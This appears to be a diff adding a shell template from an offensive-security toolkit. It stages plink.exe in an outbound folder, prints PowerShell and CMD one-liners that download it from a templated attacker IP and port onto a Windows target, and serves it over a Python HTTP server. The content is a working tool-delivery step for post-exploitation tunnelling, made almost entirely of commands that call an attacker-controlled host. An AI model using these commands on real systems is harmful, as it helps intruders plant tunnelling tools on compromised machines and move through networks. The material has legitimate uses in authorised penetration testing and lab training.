@@ -1,0 +1,9 @@
+mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/binaries/plink.exe packstation/outbound; \
+echo '================================================================'; \
+echo '                      -----PowerShell-----                      '; \
+echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/plink.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\plink.exe'; \
+echo '================================================================'; \
+echo '                         -----CMD-----                          '; \
+echo 'Deliver only: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/plink.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\plink.exe'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
